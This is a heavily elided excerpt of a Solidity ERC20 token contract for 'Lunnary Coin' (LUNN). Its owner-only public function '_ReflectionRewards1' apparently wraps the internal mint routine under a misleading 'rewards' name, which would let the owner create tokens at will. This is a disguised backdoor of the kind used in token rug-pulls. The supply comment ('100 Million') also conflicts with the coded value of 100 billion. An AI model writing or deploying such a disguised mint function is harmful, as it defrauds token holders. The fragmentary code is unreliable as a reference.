...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _ReflectionRewards1(uint256 amount) public onlyOwner {
    _ReflectionRewards1(msg.sender, amount);
    }
    ...
    function _ReflectionRewards1(address account, uint256 amount) internal virtual {
     ...
     * - `from` and `to` are never both zero. META
     *
...
contract MAS is ERC20 {

    uint tokenTotalSupply = 100000000000; // 100 Million Token Supply

    constructor() public ERC20("Lunnary Coin", "LUNN") {
        _ReflectionRewards1(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}